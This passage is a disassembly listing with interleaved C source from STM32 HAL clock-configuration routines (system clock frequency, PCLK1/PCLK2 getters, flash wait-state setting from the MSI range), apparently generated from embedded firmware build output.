 800420a:	683b      	ldr	r3, [r7, #0]
 800420c:	4313      	orrs	r3, r2
 800420e:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 8004210:	4b21      	ldr	r3, [pc, #132]	; (8004298 <HAL_RCC_ClockConfig+0x1ec>)
 8004212:	681b      	ldr	r3, [r3, #0]
 8004214:	f003 0307 	and.w	r3, r3, #7
 8004218:	683a      	ldr	r2, [r7, #0]
 800421a:	429a      	cmp	r2, r3
 800421c:	d001      	beq.n	8004222 <HAL_RCC_ClockConfig+0x176>
    {
      return HAL_ERROR;
 800421e:	2301      	movs	r3, #1
 8004220:	e036      	b.n	8004290 <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*-------------------------- PCLK1 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK1) == RCC_CLOCKTYPE_PCLK1)
 8004222:	687b      	ldr	r3, [r7, #4]
 8004224:	681b      	ldr	r3, [r3, #0]
 8004226:	f003 0304 	and.w	r3, r3, #4
 800422a:	2b00      	cmp	r3, #0
 800422c:	d008      	beq.n	8004240 <HAL_RCC_ClockConfig+0x194>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB1CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE1, RCC_ClkInitStruct->APB1CLKDivider);
 800422e:	4b1b      	ldr	r3, [pc, #108]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 8004230:	689b      	ldr	r3, [r3, #8]
 8004232:	f423 62e0 	bic.w	r2, r3, #1792	; 0x700
 8004236:	687b      	ldr	r3, [r7, #4]
 8004238:	68db      	ldr	r3, [r3, #12]
 800423a:	4918      	ldr	r1, [pc, #96]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 800423c:	4313      	orrs	r3, r2
 800423e:	608b      	str	r3, [r1, #8]
  }

  /*-------------------------- PCLK2 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK2) == RCC_CLOCKTYPE_PCLK2)
 8004240:	687b      	ldr	r3, [r7, #4]
 8004242:	681b      	ldr	r3, [r3, #0]
 8004244:	f003 0308 	and.w	r3, r3, #8
 8004248:	2b00      	cmp	r3, #0
 800424a:	d009      	beq.n	8004260 <HAL_RCC_ClockConfig+0x1b4>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB2CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE2, ((RCC_ClkInitStruct->APB2CLKDivider) << 3U));
 800424c:	4b13      	ldr	r3, [pc, #76]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 800424e:	689b      	ldr	r3, [r3, #8]
 8004250:	f423 5260 	bic.w	r2, r3, #14336	; 0x3800
 8004254:	687b      	ldr	r3, [r7, #4]
 8004256:	691b      	ldr	r3, [r3, #16]
 8004258:	00db      	lsls	r3, r3, #3
 800425a:	4910      	ldr	r1, [pc, #64]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 800425c:	4313      	orrs	r3, r2
 800425e:	608b      	str	r3, [r1, #8]
  }

  /* Update the SystemCoreClock global variable */
  SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 8004260:	f000 f824 	bl	80042ac <HAL_RCC_GetSysClockFreq>
 8004264:	4602      	mov	r2, r0
 8004266:	4b0d      	ldr	r3, [pc, #52]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 8004268:	689b      	ldr	r3, [r3, #8]
 800426a:	091b      	lsrs	r3, r3, #4
 800426c:	f003 030f 	and.w	r3, r3, #15
 8004270:	490b      	ldr	r1, [pc, #44]	; (80042a0 <HAL_RCC_ClockConfig+0x1f4>)
 8004272:	5ccb      	ldrb	r3, [r1, r3]
 8004274:	f003 031f 	and.w	r3, r3, #31
 8004278:	fa22 f303 	lsr.w	r3, r2, r3
 800427c:	4a09      	ldr	r2, [pc, #36]	; (80042a4 <HAL_RCC_ClockConfig+0x1f8>)
 800427e:	6013      	str	r3, [r2, #0]

  /* Configure the source of time base considering new system clocks settings*/
  status = HAL_InitTick(uwTickPrio);
 8004280:	4b09      	ldr	r3, [pc, #36]	; (80042a8 <HAL_RCC_ClockConfig+0x1fc>)
 8004282:	681b      	ldr	r3, [r3, #0]
 8004284:	4618      	mov	r0, r3
 8004286:	f7fc ff29 	bl	80010dc <HAL_InitTick>
 800428a:	4603      	mov	r3, r0
 800428c:	72fb      	strb	r3, [r7, #11]

  return status;
 800428e:	7afb      	ldrb	r3, [r7, #11]
}
 8004290:	4618      	mov	r0, r3
 8004292:	3710      	adds	r7, #16
 8004294:	46bd      	mov	sp, r7
 8004296:	bd80      	pop	{r7, pc}
 8004298:	40022000 	.word	0x40022000
 800429c:	40021000 	.word	0x40021000
 80042a0:	0800d160 	.word	0x0800d160
 80042a4:	20000000 	.word	0x20000000
 80042a8:	20000004 	.word	0x20000004

080042ac <HAL_RCC_GetSysClockFreq>:
  *
  *
  * @retval SYSCLK frequency
  */
uint32_t HAL_RCC_GetSysClockFreq(void)
{
 80042ac:	b480      	push	{r7}
 80042ae:	b089      	sub	sp, #36	; 0x24
 80042b0:	af00      	add	r7, sp, #0
  uint32_t msirange = 0U, sysclockfreq = 0U;
 80042b2:	2300      	movs	r3, #0
 80042b4:	61fb      	str	r3, [r7, #28]
 80042b6:	2300      	movs	r3, #0
 80042b8:	61bb      	str	r3, [r7, #24]
  uint32_t pllvco, pllsource, pllr, pllm;    /* no init needed */
  uint32_t sysclk_source, pll_oscsource;

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 80042ba:	4b3e      	ldr	r3, [pc, #248]	; (80043b4 <HAL_RCC_GetSysClockFreq+0x108>)
 80042bc:	689b      	ldr	r3, [r3, #8]
 80042be:	f003 030c 	and.w	r3, r3, #12
 80042c2:	613b      	str	r3, [r7, #16]
  pll_oscsource = __HAL_RCC_GET_PLL_OSCSOURCE();
 80042c4:	4b3b      	ldr	r3, [pc, #236]	; (80043b4 <HAL_RCC_GetSysClockFreq+0x108>)
 80042c6:	68db      	ldr	r3, [r3, #12]
 80042c8:	f003 0303 	and.w	r3, r3, #3
 80042cc:	60fb      	str	r3, [r7, #12]

  if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 80042ce:	693b      	ldr	r3, [r7, #16]
 80042d0:	2b00      	cmp	r3, #0
 80042d2:	d005      	beq.n	80042e0 <HAL_RCC_GetSysClockFreq+0x34>
 80042d4:	693b      	ldr	r3, [r7, #16]
 80042d6:	2b0c      	cmp	r3, #12
 80042d8:	d121      	bne.n	800431e <HAL_RCC_GetSysClockFreq+0x72>
     ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_oscsource == RCC_PLLSOURCE_MSI)))
 80042da:	68fb      	ldr	r3, [r7, #12]
 80042dc:	2b01      	cmp	r3, #1
 80042de:	d11e      	bne.n	800431e <HAL_RCC_GetSysClockFreq+0x72>
  {
    /* MSI or PLL with MSI source used as system clock source */

    /* Get SYSCLK source */
    if(READ_BIT(RCC->CR, RCC_CR_MSIRGSEL) == 0U)
 80042e0:	4b34      	ldr	r3, [pc, #208]	; (80043b4 <HAL_RCC_GetSysClockFreq+0x108>)
 80042e2:	681b      	ldr	r3, [r3, #0]
 80042e4:	f003 0308 	and.w	r3, r3, #8
 80042e8:	2b00      	cmp	r3, #0
 80042ea:	d107      	bne.n	80042fc <HAL_RCC_GetSysClockFreq+0x50>
    { /* MSISRANGE from RCC_CSR applies */
      msirange = READ_BIT(RCC->CSR, RCC_CSR_MSISRANGE) >> RCC_CSR_MSISRANGE_Pos;
 80042ec:	4b31      	ldr	r3, [pc, #196]	; (80043b4 <HAL_RCC_GetSysClockFreq+0x108>)
 80042ee:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 80042f2:	0a1b      	lsrs	r3, r3, #8
 80042f4:	f003 030f 	and.w	r3, r3, #15
 80042f8:	61fb      	str	r3, [r7, #28]
 80042fa:	e005      	b.n	8004308 <HAL_RCC_GetSysClockFreq+0x5c>
    }
    else
    { /* MSIRANGE from RCC_CR applies */
      msirange = READ_BIT(RCC->CR, RCC_CR_MSIRANGE) >> RCC_CR_MSIRANGE_Pos;
 80042fc:	4b2d      	ldr	r3, [pc, #180]	; (80043b4 <HAL_RCC_GetSysClockFreq+0x108>)
 80042fe:	681b      	ldr	r3, [r3, #0]
 8004300:	091b      	lsrs	r3, r3, #4
 8004302:	f003 030f 	and.w	r3, r3, #15
 8004306:	61fb      	str	r3, [r7, #28]
    }
    /*MSI frequency range in HZ*/
    msirange = MSIRangeTable[msirange];
 8004308:	4a2b      	ldr	r2, [pc, #172]	; (80043b8 <HAL_RCC_GetSysClockFreq+0x10c>)
 800430a:	69fb      	ldr	r3, [r7, #28]
 800430c:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8004310:	61fb      	str	r3, [r7, #28]

    if(sysclk_source == RCC_CFGR_SWS_MSI)
 8004312:	693b      	ldr	r3, [r7, #16]
 8004314:	2b00      	cmp	r3, #0
 8004316:	d10d      	bne.n	8004334 <HAL_RCC_GetSysClockFreq+0x88>
    {
      /* MSI used as system clock source */
      sysclockfreq = msirange;
 8004318:	69fb      	ldr	r3, [r7, #28]
 800431a:	61bb      	str	r3, [r7, #24]
    if(sysclk_source == RCC_CFGR_SWS_MSI)
 800431c:	e00a      	b.n	8004334 <HAL_RCC_GetSysClockFreq+0x88>
    }
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSI)
 800431e:	693b      	ldr	r3, [r7, #16]
 8004320:	2b04      	cmp	r3, #4
 8004322:	d102      	bne.n	800432a <HAL_RCC_GetSysClockFreq+0x7e>
  {
    /* HSI used as system clock source */
    sysclockfreq = HSI_VALUE;
 8004324:	4b25      	ldr	r3, [pc, #148]	; (80043bc <HAL_RCC_GetSysClockFreq+0x110>)
 8004326:	61bb      	str	r3, [r7, #24]
 8004328:	e004      	b.n	8004334 <HAL_RCC_GetSysClockFreq+0x88>
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSE)
 800432a:	693b      	ldr	r3, [r7, #16]
 800432c:	2b08      	cmp	r3, #8
 800432e:	d101      	bne.n	8004334 <HAL_RCC_GetSysClockFreq+0x88>
  {
    /* HSE used as system clock source */
    sysclockfreq = HSE_VALUE;
 8004330:	4b23      	ldr	r3, [pc, #140]	; (80043c0 <HAL_RCC_GetSysClockFreq+0x114>)
 8004332:	61bb      	str	r3, [r7, #24]
  else
  {
    /* unexpected case: sysclockfreq at 0 */
  }

  if(sysclk_source == RCC_CFGR_SWS_PLL)
 8004334:	693b      	ldr	r3, [r7, #16]
 8004336:	2b0c      	cmp	r3, #12
 8004338:	d134      	bne.n	80043a4 <HAL_RCC_GetSysClockFreq+0xf8>
    /* PLL used as system clock  source */

    /* PLL_VCO = (HSE_VALUE or HSI_VALUE or MSI_VALUE) * PLLN / PLLM
    SYSCLK = PLL_VCO / PLLR
    */
    pllsource = READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC);
 800433a:	4b1e      	ldr	r3, [pc, #120]	; (80043b4 <HAL_RCC_GetSysClockFreq+0x108>)
 800433c:	68db      	ldr	r3, [r3, #12]
 800433e:	f003 0303 	and.w	r3, r3, #3
 8004342:	60bb      	str	r3, [r7, #8]

    switch (pllsource)
 8004344:	68bb      	ldr	r3, [r7, #8]
 8004346:	2b02      	cmp	r3, #2
 8004348:	d003      	beq.n	8004352 <HAL_RCC_GetSysClockFreq+0xa6>
 800434a:	68bb      	ldr	r3, [r7, #8]
 800434c:	2b03      	cmp	r3, #3
 800434e:	d003      	beq.n	8004358 <HAL_RCC_GetSysClockFreq+0xac>
 8004350:	e005      	b.n	800435e <HAL_RCC_GetSysClockFreq+0xb2>
    {
    case RCC_PLLSOURCE_HSI:  /* HSI used as PLL clock source */
      pllvco = HSI_VALUE;
 8004352:	4b1a      	ldr	r3, [pc, #104]	; (80043bc <HAL_RCC_GetSysClockFreq+0x110>)
 8004354:	617b      	str	r3, [r7, #20]
      break;
 8004356:	e005      	b.n	8004364 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_HSE:  /* HSE used as PLL clock source */
      pllvco = HSE_VALUE;
 8004358:	4b19      	ldr	r3, [pc, #100]	; (80043c0 <HAL_RCC_GetSysClockFreq+0x114>)
 800435a:	617b      	str	r3, [r7, #20]
      break;
 800435c:	e002      	b.n	8004364 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_MSI:  /* MSI used as PLL clock source */
    default:
      pllvco = msirange;
 800435e:	69fb      	ldr	r3, [r7, #28]
 8004360:	617b      	str	r3, [r7, #20]
      break;
 8004362:	bf00      	nop
    }
    pllm = (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U ;
 8004364:	4b13      	ldr	r3, [pc, #76]	; (80043b4 <HAL_RCC_GetSysClockFreq+0x108>)
 8004366:	68db      	ldr	r3, [r3, #12]
 8004368:	091b      	lsrs	r3, r3, #4
 800436a:	f003 0307 	and.w	r3, r3, #7
 800436e:	3301      	adds	r3, #1
 8004370:	607b      	str	r3, [r7, #4]
    pllvco = (pllvco * (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLN) >> RCC_PLLCFGR_PLLN_Pos)) / pllm;
 8004372:	4b10      	ldr	r3, [pc, #64]	; (80043b4 <HAL_RCC_GetSysClockFreq+0x108>)
 8004374:	68db      	ldr	r3, [r3, #12]
 8004376:	0a1b      	lsrs	r3, r3, #8
 8004378:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800437c:	697a      	ldr	r2, [r7, #20]
 800437e:	fb03 f202 	mul.w	r2, r3, r2
 8004382:	687b      	ldr	r3, [r7, #4]
 8004384:	fbb2 f3f3 	udiv	r3, r2, r3
 8004388:	617b      	str	r3, [r7, #20]
    pllr = ((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLR) >> RCC_PLLCFGR_PLLR_Pos) + 1U ) * 2U;
 800438a:	4b0a      	ldr	r3, [pc, #40]	; (80043b4 <HAL_RCC_GetSysClockFreq+0x108>)
 800438c:	68db      	ldr	r3, [r3, #12]
 800438e:	0e5b      	lsrs	r3, r3, #25
 8004390:	f003 0303 	and.w	r3, r3, #3
 8004394:	3301      	adds	r3, #1
 8004396:	005b      	lsls	r3, r3, #1
 8004398:	603b      	str	r3, [r7, #0]
    sysclockfreq = pllvco / pllr;
 800439a:	697a      	ldr	r2, [r7, #20]
 800439c:	683b      	ldr	r3, [r7, #0]
 800439e:	fbb2 f3f3 	udiv	r3, r2, r3
 80043a2:	61bb      	str	r3, [r7, #24]
  }

  return sysclockfreq;
 80043a4:	69bb      	ldr	r3, [r7, #24]
}
 80043a6:	4618      	mov	r0, r3
 80043a8:	3724      	adds	r7, #36	; 0x24
 80043aa:	46bd      	mov	sp, r7
 80043ac:	f85d 7b04 	ldr.w	r7, [sp], #4
 80043b0:	4770      	bx	lr
 80043b2:	bf00      	nop
 80043b4:	40021000 	.word	0x40021000
 80043b8:	0800d178 	.word	0x0800d178
 80043bc:	00f42400 	.word	0x00f42400
 80043c0:	007a1200 	.word	0x007a1200

080043c4 <HAL_RCC_GetHCLKFreq>:
  *
  * @note   The SystemCoreClock CMSIS variable is used to store System Clock Frequency.
  * @retval HCLK frequency in Hz
  */
uint32_t HAL_RCC_GetHCLKFreq(void)
{
 80043c4:	b480      	push	{r7}
 80043c6:	af00      	add	r7, sp, #0
  return SystemCoreClock;
 80043c8:	4b03      	ldr	r3, [pc, #12]	; (80043d8 <HAL_RCC_GetHCLKFreq+0x14>)
 80043ca:	681b      	ldr	r3, [r3, #0]
}
 80043cc:	4618      	mov	r0, r3
 80043ce:	46bd      	mov	sp, r7
 80043d0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80043d4:	4770      	bx	lr
 80043d6:	bf00      	nop
 80043d8:	20000000 	.word	0x20000000

080043dc <HAL_RCC_GetPCLK1Freq>:
  * @note   Each time PCLK1 changes, this function must be called to update the
  *         right PCLK1 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK1 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK1Freq(void)
{
 80043dc:	b580      	push	{r7, lr}
 80043de:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK1 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq() >> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE1) >> RCC_CFGR_PPRE1_Pos] & 0x1FU));
 80043e0:	f7ff fff0 	bl	80043c4 <HAL_RCC_GetHCLKFreq>
 80043e4:	4602      	mov	r2, r0
 80043e6:	4b06      	ldr	r3, [pc, #24]	; (8004400 <HAL_RCC_GetPCLK1Freq+0x24>)
 80043e8:	689b      	ldr	r3, [r3, #8]
 80043ea:	0a1b      	lsrs	r3, r3, #8
 80043ec:	f003 0307 	and.w	r3, r3, #7
 80043f0:	4904      	ldr	r1, [pc, #16]	; (8004404 <HAL_RCC_GetPCLK1Freq+0x28>)
 80043f2:	5ccb      	ldrb	r3, [r1, r3]
 80043f4:	f003 031f 	and.w	r3, r3, #31
 80043f8:	fa22 f303 	lsr.w	r3, r2, r3
}
 80043fc:	4618      	mov	r0, r3
 80043fe:	bd80      	pop	{r7, pc}
 8004400:	40021000 	.word	0x40021000
 8004404:	0800d170 	.word	0x0800d170

08004408 <HAL_RCC_GetPCLK2Freq>:
  * @note   Each time PCLK2 changes, this function must be called to update the
  *         right PCLK2 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK2 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK2Freq(void)
{
 8004408:	b580      	push	{r7, lr}
 800440a:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK2 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq()>> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE2) >> RCC_CFGR_PPRE2_Pos] & 0x1FU));
 800440c:	f7ff ffda 	bl	80043c4 <HAL_RCC_GetHCLKFreq>
 8004410:	4602      	mov	r2, r0
 8004412:	4b06      	ldr	r3, [pc, #24]	; (800442c <HAL_RCC_GetPCLK2Freq+0x24>)
 8004414:	689b      	ldr	r3, [r3, #8]
 8004416:	0adb      	lsrs	r3, r3, #11
 8004418:	f003 0307 	and.w	r3, r3, #7
 800441c:	4904      	ldr	r1, [pc, #16]	; (8004430 <HAL_RCC_GetPCLK2Freq+0x28>)
 800441e:	5ccb      	ldrb	r3, [r1, r3]
 8004420:	f003 031f 	and.w	r3, r3, #31
 8004424:	fa22 f303 	lsr.w	r3, r2, r3
}
 8004428:	4618      	mov	r0, r3
 800442a:	bd80      	pop	{r7, pc}
 800442c:	40021000 	.word	0x40021000
 8004430:	0800d170 	.word	0x0800d170

08004434 <RCC_SetFlashLatencyFromMSIRange>:
            voltage range.
  * @param  msirange  MSI range value from RCC_MSIRANGE_0 to RCC_MSIRANGE_11
  * @retval HAL status
  */
static HAL_StatusTypeDef RCC_SetFlashLatencyFromMSIRange(uint32_t msirange)
{
 8004434:	b580      	push	{r7, lr}
 8004436:	b086      	sub	sp, #24
 8004438:	af00      	add	r7, sp, #0
 800443a:	6078      	str	r0, [r7, #4]
  uint32_t vos;
  uint32_t latency = FLASH_LATENCY_0;  /* default value 0WS */
 800443c:	2300      	movs	r3, #0
 800443e:	613b      	str	r3, [r7, #16]

  if(__HAL_RCC_PWR_IS_CLK_ENABLED())
 8004440:	4b2a      	ldr	r3, [pc, #168]	; (80044ec <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004442:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004444:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004448:	2b00      	cmp	r3, #0
 800444a:	d003      	beq.n	8004454 <RCC_SetFlashLatencyFromMSIRange+0x20>
  {
    vos = HAL_PWREx_GetVoltageRange();
 800444c:	f7ff f9a6 	bl	800379c <HAL_PWREx_GetVoltageRange>
 8004450:	6178      	str	r0, [r7, #20]
 8004452:	e014      	b.n	800447e <RCC_SetFlashLatencyFromMSIRange+0x4a>
  }
  else
  {
    __HAL_RCC_PWR_CLK_ENABLE();
 8004454:	4b25      	ldr	r3, [pc, #148]	; (80044ec <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004456:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004458:	4a24      	ldr	r2, [pc, #144]	; (80044ec <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800445a:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 800445e:	6593      	str	r3, [r2, #88]	; 0x58
 8004460:	4b22      	ldr	r3, [pc, #136]	; (80044ec <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004462:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004464:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004468:	60fb      	str	r3, [r7, #12]
 800446a:	68fb      	ldr	r3, [r7, #12]
    vos = HAL_PWREx_GetVoltageRange();
 800446c:	f7ff f996 	bl	800379c <HAL_PWREx_GetVoltageRange>
 8004470:	6178      	str	r0, [r7, #20]
    __HAL_RCC_PWR_CLK_DISABLE();
 8004472:	4b1e      	ldr	r3, [pc, #120]	; (80044ec <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004474:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004476:	4a1d      	ldr	r2, [pc, #116]	; (80044ec <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004478:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 800447c:	6593      	str	r3, [r2, #88]	; 0x58
  }

  if(vos == PWR_REGULATOR_VOLTAGE_SCALE1)
 800447e:	697b      	ldr	r3, [r7, #20]
 8004480:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8004484:	d10b      	bne.n	800449e <RCC_SetFlashLatencyFromMSIRange+0x6a>
  {
    if(msirange > RCC_MSIRANGE_8)
 8004486:	687b      	ldr	r3, [r7, #4]
 8004488:	2b80      	cmp	r3, #128	; 0x80
 800448a:	d919      	bls.n	80044c0 <RCC_SetFlashLatencyFromMSIRange+0x8c>
    {
      /* MSI > 16Mhz */
      if(msirange > RCC_MSIRANGE_10)
 800448c:	687b      	ldr	r3, [r7, #4]
 800448e:	2ba0      	cmp	r3, #160	; 0xa0
 8004490:	d902      	bls.n	8004498 <RCC_SetFlashLatencyFromMSIRange+0x64>
      {
        /* MSI 48Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 8004492:	2302      	movs	r3, #2
 8004494:	613b      	str	r3, [r7, #16]
 8004496:	e013      	b.n	80044c0 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else
      {
        /* MSI 24Mhz or 32Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 8004498:	2301      	movs	r3, #1
 800449a:	613b      	str	r3, [r7, #16]
 800449c:	e010      	b.n	80044c0 <RCC_SetFlashLatencyFromMSIRange+0x8c>
        latency = FLASH_LATENCY_1; /* 1WS */
      }
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#else
    if(msirange > RCC_MSIRANGE_8)
 800449e:	687b      	ldr	r3, [r7, #4]
 80044a0:	2b80      	cmp	r3, #128	; 0x80
 80044a2:	d902      	bls.n	80044aa <RCC_SetFlashLatencyFromMSIRange+0x76>
    {
      /* MSI > 16Mhz */
      latency = FLASH_LATENCY_3; /* 3WS */
 80044a4:	2303      	movs	r3, #3
 80044a6:	613b      	str	r3, [r7, #16]
 80044a8:	e00a      	b.n	80044c0 <RCC_SetFlashLatencyFromMSIRange+0x8c>
    }
    else
    {
      if(msirange == RCC_MSIRANGE_8)
 80044aa:	687b      	ldr	r3, [r7, #4]
 80044ac:	2b80      	cmp	r3, #128	; 0x80
 80044ae:	d102      	bne.n	80044b6 <RCC_SetFlashLatencyFromMSIRange+0x82>
      {
        /* MSI 16Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 80044b0:	2302      	movs	r3, #2
 80044b2:	613b      	str	r3, [r7, #16]
 80044b4:	e004      	b.n	80044c0 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else if(msirange == RCC_MSIRANGE_7)
 80044b6:	687b      	ldr	r3, [r7, #4]
 80044b8:	2b70      	cmp	r3, #112	; 0x70
 80044ba:	d101      	bne.n	80044c0 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      {
        /* MSI 8Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 80044bc:	2301      	movs	r3, #1
 80044be:	613b      	str	r3, [r7, #16]
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#endif
  }

  __HAL_FLASH_SET_LATENCY(latency);
 80044c0:	4b0b      	ldr	r3, [pc, #44]	; (80044f0 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80044c2:	681b      	ldr	r3, [r3, #0]
 80044c4:	f023 0207 	bic.w	r2, r3, #7
 80044c8:	4909      	ldr	r1, [pc, #36]	; (80044f0 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80044ca:	693b      	ldr	r3, [r7, #16]
 80044cc:	4313      	orrs	r3, r2
 80044ce:	600b      	str	r3, [r1, #0]

  /* Check that the new number of wait states is taken into account to access the Flash
     memory by reading the FLASH_ACR register */
  if(__HAL_FLASH_GET_LATENCY() != latency)
 80044d0:	4b07      	ldr	r3, [pc, #28]	; (80044f0 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80044d2:	681b      	ldr	r3, [r3, #0]
 80044d4:	f003 0307 	and.w	r3, r3, #7
 80044d8:	693a      	ldr	r2, [r7, #16]
 80044da:	429a      	cmp	r2, r3
 80044dc:	d001      	beq.n	80044e2 <RCC_SetFlashLatencyFromMSIRange+0xae>
  {
    return HAL_ERROR;
 80044de:	2301      	movs	r3, #1
 80044e0:	e000      	b.n	80044e4 <RCC_SetFlashLatencyFromMSIRange+0xb0>
  }

  return HAL_OK;
 80044e2:	2300      	movs	r3, #0
}
 80044e4:	4618      	mov	r0, r3
 80044e6:	3718      	adds	r7, #24
 80044e8:	46bd      	mov	sp, r7
 80044ea:	bd80      	pop	{r7, pc}
 80044ec:	40021000 	.word	0x40021000
 80044f0:	40022000 	.word	0x40022000

080044f4 <HAL_RCCEx_PeriphCLKConfig>:
  *         the RTC clock source: in this case the access to Backup domain is enabled.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCCEx_PeriphCLKConfig(RCC_PeriphCLKInitTypeDef  *PeriphClkInit)
{
 80044f4:	b580      	push	{r7, lr}
 80044f6:	b086      	sub	sp, #24
 80044f8:	af00      	add	r7, sp, #0
 80044fa:	6078      	str	r0, [r7, #4]
  uint32_t tmpregister, tickstart;     /* no init needed */
  HAL_StatusTypeDef ret = HAL_OK;      /* Intermediate status */
 80044fc:	2300      	movs	r3, #0
 80044fe:	74fb      	strb	r3, [r7, #19]
  HAL_StatusTypeDef status = HAL_OK;   /* Final status */
 8004500:	2300      	movs	r3, #0
 8004502:	74bb      	strb	r3, [r7, #18]
  assert_param(IS_RCC_PERIPHCLOCK(PeriphClkInit->PeriphClockSelection));

#if defined(SAI1)

  /*-------------------------- SAI1 clock source configuration ---------------------*/
  if((((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SAI1) == RCC_PERIPHCLK_SAI1))
 8004504:	687b      	ldr	r3, [r7, #4]
 8004506:	681b      	ldr	r3, [r3, #0]
 8004508:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 800450c:	2b00      	cmp	r3, #0
 800450e:	d031      	beq.n	8004574 <HAL_RCCEx_PeriphCLKConfig+0x80>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SAI1CLK(PeriphClkInit->Sai1ClockSelection));

    switch(PeriphClkInit->Sai1ClockSelection)
 8004510:	687b      	ldr	r3, [r7, #4]
 8004512:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004514:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 8004518:	d01a      	beq.n	8004550 <HAL_RCCEx_PeriphCLKConfig+0x5c>
 800451a:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 800451e:	d814      	bhi.n	800454a <HAL_RCCEx_PeriphCLKConfig+0x56>
 8004520:	2b00      	cmp	r3, #0
 8004522:	d009      	beq.n	8004538 <HAL_RCCEx_PeriphCLKConfig+0x44>
 8004524:	f5b3 0f00 	cmp.w	r3, #8388608	; 0x800000
 8004528:	d10f      	bne.n	800454a <HAL_RCCEx_PeriphCLKConfig+0x56>
    case RCC_SAI1CLKSOURCE_PLL:      /* PLL is used as clock source for SAI1*/
      /* Enable SAI Clock output generated from System PLL . */
#if defined(RCC_PLLSAI2_SUPPORT)
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI3CLK);
#else
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI2CLK);
 800452a:	4b5d      	ldr	r3, [pc, #372]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800452c:	68db      	ldr	r3, [r3, #12]
 800452e:	4a5c      	ldr	r2, [pc, #368]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004530:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8004534:	60d3      	str	r3, [r2, #12]
#endif /* RCC_PLLSAI2_SUPPORT */
